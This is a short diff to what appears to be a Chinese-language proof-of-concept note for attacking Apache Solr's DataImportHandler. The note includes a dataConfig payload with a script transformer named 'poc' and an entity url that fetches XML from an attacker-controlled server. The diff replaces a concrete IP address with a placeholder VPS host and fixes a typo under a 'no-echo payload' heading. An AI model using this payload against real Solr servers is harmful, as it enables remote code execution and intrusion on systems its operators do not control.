@@ -65,7 +65,7 @@ return row;
 
         <document>
              <entity name="entity1"
-                     url="http://47.74.31.64:8000/bin4xin.xml"
+                     url="http://{your_vps_ip}:{your_vps_port}/bin4xin.xml"
                      processor="XPathEntityProcessor"
                      forEach="/RDF/item"
                      transformer="script:poc">
@@ -80,7 +80,7 @@ return row;
 
 ### # 无回显payload
 
-区别在与dataConfig：
+区别在于dataConfig：
 ```
 <dataConfig>
 <dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />
